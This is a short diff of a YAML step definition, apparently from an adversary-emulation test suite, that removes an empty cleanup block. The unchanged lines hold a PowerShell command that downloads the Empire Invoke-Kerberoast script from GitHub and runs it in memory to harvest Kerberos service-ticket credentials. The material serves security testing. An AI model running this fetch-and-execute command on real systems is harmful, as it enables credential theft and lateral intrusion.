@@ -19,6 +19,3 @@ steps:
         iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
         Invoke-Kerberoast | fl
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
